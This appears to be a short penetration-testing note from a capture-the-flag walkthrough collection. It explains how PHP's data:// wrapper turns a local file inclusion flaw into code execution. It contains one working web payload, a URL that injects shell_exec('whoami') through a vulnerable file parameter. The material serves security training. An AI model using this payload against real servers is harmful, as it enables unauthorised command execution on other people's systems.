## <ins>PHP Wrapper</ins>

- [Slort PG Walkthrough](https://defaultcredentials.com/ctf/proving-grounds/slort-proving-grounds-walkthrough/)

It can be used to exploit Directory Traversal and LFI. This gives us additional flexibility when attempting to inject PHP code via LFI vulnerabilities. This wrapper provides us with an alternative payload when we cannot poison a local file with PHP code.

```
# We know this is vulnerable to LFI so we use a data wrapper
# Hence, LFI without manipulating the local file. # ADDING SHELL EXEC IN END TO SEE
http://<IP>/menu.php?file=data:text/plain,<?php echo shell_exec("whoami")?>
```

